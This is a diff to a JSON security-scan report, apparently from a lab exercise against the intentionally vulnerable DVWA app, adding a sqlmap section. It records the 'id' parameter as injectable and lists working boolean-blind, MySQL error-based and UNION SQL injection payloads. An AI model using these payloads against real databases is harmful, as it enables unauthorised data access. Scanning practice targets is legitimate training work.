@@ -3,7 +3,8 @@
         "total_urls_unicas": 15,
         "urls_spider": 47,
         "alertas_zap": 8,
-        "rutas_ffuf": 12
+        "rutas_ffuf": 12,
+        "vulnerabilidades_sqlmap": 1
     },
     "spider": {
         "herramienta": "ZAP Spider",
@@ -26,5 +27,14 @@
         "fecha": "2026-02-19...",
         "total_rutas": 12,
         "rutas": [{"url": "http://dvwa/admin", "status": 200, "input": {"FUZZ": "admin"}}]
+    },
+    "sqlmap": {
+        "herramienta": "SQLMAP",
+        "vulnerabilidades": [
+            {
+                "url": "http://dvwa/vulnerabilities/sqli/?id=1",
+                "salida": "[INFO] testing connection to the target URL\n[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n...\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=1 AND 8731=8731\n\n    Type: error-based\n    Title: MySQL >= 5.0 error-based\n    Payload: id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7162,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 2 columns\n    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7162,0x71)-- -\n\n[INFO] the parameter 'id' is vulnerable"
+            }
+        ]
     }
 }
